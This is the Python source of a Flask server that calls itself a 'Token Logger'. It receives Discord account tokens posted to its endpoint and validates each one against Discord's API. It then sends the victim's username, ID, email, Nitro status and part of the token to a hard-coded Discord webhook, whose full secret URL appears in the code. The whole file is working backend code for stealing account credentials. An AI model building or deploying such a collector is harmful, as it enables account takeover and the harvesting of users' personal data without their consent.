from flask import Flask, request, jsonify
import requests
import os
from datetime import datetime

app = Flask(__name__)

# Discord webhook (set in Render environment variables)
DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK', 'https://discord.com/api/webhooks/1469196049858957425/h49L6NNy9XMHLhhUe372RfL5Dwzvbk9JSb8pEb7BP1hgV7UehmMvWH4Zav559t8V2tFj')

@app.route('/api/token', methods=['POST'])
def handle_token():
    """Simple endpoint to receive tokens"""
    try:
        data = request.json
        token = data.get('token', '').strip()
        
        if not token:
            return jsonify({'error': 'No token provided'}), 400
        
        print(f"Received token: {token[:30]}...")
        
        # Check if token is valid with Discord
        user_info = check_discord_token(token)
        
        # Send to Discord webhook
        send_to_discord(token, user_info)
        
        return jsonify({'message': 'Token processed'}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': 'Server error'}), 500

def check_discord_token(token):
    """Check token with Discord API"""
    headers = {'Authorization': token}
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', 
                               headers=headers, timeout=5)
        
        if response.status_code == 200:
            user = response.json()
            return {
                'valid': True,
                'username': f"{user.get('username', 'Unknown')}#{user.get('discriminator', '0')}",
                'id': user.get('id'),
                'email': user.get('email', 'No email'),
                'verified': user.get('verified', False),
                'nitro': 'Yes' if user.get('premium_type') else 'No'
            }
        else:
            return {'valid': False, 'error': f'HTTP {response.status_code}'}
            
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def send_to_discord(token, user_info):
    """Send formatted message to Discord webhook"""
    
    if user_info.get('valid'):
        # Valid token embed
        embed = {
            'title': '✅ Token Found',
            'color': 0x00ff00,
            'fields': [
                {'name': 'Username', 'value': user_info['username'], 'inline': True},
                {'name': 'ID', 'value': user_info['id'], 'inline': True},
                {'name': 'Email', 'value': user_info['email'], 'inline': True},
                {'name': 'Nitro', 'value': user_info['nitro'], 'inline': True},
                {'name': 'Token', 'value': f'`{token[:25]}...`', 'inline': False},
                {'name': 'Time', 'value': datetime.now().strftime('%H:%M:%S'), 'inline': False}
            ]
        }
    else:
        # Invalid token embed
        embed = {
            'title': '❌ Invalid Token',
            'color': 0xff0000,
            'fields': [
                {'name': 'Error', 'value': user_info.get('error', 'Unknown'), 'inline': False},
                {'name': 'Token', 'value': f'`{token[:20]}...`', 'inline': False}
            ]
        }
    
    payload = {
        'username': 'Token Logger',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass  # Silently fail if webhook fails

@app.route('/')
def home():
    return jsonify({'status': 'running', 'message': 'Token logger API'})

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
